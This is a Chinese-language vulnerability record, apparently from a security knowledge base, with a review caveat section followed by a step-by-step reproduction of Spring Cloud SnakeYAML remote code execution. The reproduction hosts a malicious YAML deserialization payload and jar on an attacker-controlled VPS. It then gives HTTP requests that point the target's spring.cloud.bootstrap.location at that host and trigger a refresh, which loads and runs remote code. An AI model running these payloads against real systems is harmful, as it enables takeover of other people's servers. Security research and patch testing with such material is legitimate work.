---
source: "hatch 补库批 20260928"
product: "Spring Cloud bootstrap/SnakeYAML"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Spring Cloud SnakeYAML RCE"
prerequisites: "来源所述条件，未列明部分仍待核：spring-cloud-starter<1.3.0条件有明确包名，但同时给Boot2请求需核兼容组合"
side_effects: "未执行；本文需注意的操作影响：构造与资源加载描述不精确；java.net.URL构造不自行拉jar，实际URLClassLoader/ServiceLoader加载；更改bootstrap需恢复"
source_status: "unknown"
id: "vw-3a3143d1deaa712f0eb1dc98"
entity_id: "ve-3a3143d1deaa712f0eb1dc98"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：spring-cloud-starter&lt;1.3.0条件有明确包名，但同时给Boot2请求需核兼容组合

代码与实验材料：完整YAML及env/refresh，原yaml-payload链接比407更清晰，无实际运行结果/恢复

来源证据范围：artsploit原工具，历史导入无原文章

- **事实待核（1）**：refresh组件归属与版本组合待核；依据：把refresh仅归actuator，CloudStarter&lt;1.3与Boot2是否可用需依赖矩阵。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **结论使用边界（2）**：构造与资源加载描述不精确；依据：java.net.URL构造不自行拉jar，实际URLClassLoader/ServiceLoader加载；更改bootstrap需恢复。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Spring Cloud SnakeYAML RCE

一、漏洞简介
------------

#### 利用条件：

-   可以 POST 请求目标网站的 `/env` 接口设置属性
-   可以 POST 请求目标网站的 `/refresh` 接口刷新配置（存在
    `spring-boot-starter-actuator` 依赖）
-   目标依赖的 `spring-cloud-starter` 版本 \< 1.3.0.RELEASE
-   目标可以请求攻击者的 HTTP 服务器（请求可出外网）

二、漏洞影响
------------

三、复现过程
------------

#### 漏洞分析：

1.  spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL
    地址
2.  refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容
3.  SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml
    内容时会完成指定的动作
4.  先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件
5.  然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory
    接口的类并实例化
6.  实例化类时执行恶意代码，造成 RCE 漏洞

### 漏洞复现

##### 步骤一： 托管 yml 和 jar 文件

在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP
服务端口（80、443）

    # 使用 python 快速开启 http server

    python2 -m SimpleHTTPServer 80
    python3 -m http.server 80

在网站根目录下放置后缀为 `yml` 的文件 `example.yml`，内容如下：

    !!javax.script.ScriptEngineManager [
      !!java.net.URLClassLoader [[
        !!java.net.URL ["http://your-vps-ip/example.jar"]
      ]]
    ]

在网站根目录下放置后缀为 `jar` 的文件
`example.jar`，内容是要执行的代码，代码编写及编译方式参考 yaml-payload

    https://github.com/artsploit/yaml-payload

##### 步骤二： 设置 spring.cloud.bootstrap.location 属性

spring 1.x

    POST /env
    Content-Type: application/x-www-form-urlencoded

    spring.cloud.bootstrap.location=http://your-vps-ip/example.yml

spring 2.x

    POST /actuator/env
    Content-Type: application/json

    {"name":"spring.cloud.bootstrap.location","value":"http://your-vps-ip/example.yml"}

##### 步骤三： 刷新配置

spring 1.x

    POST /refresh
    Content-Type: application/x-www-form-urlencoded

spring 2.x

    POST /actuator/refresh
    Content-Type: application/json
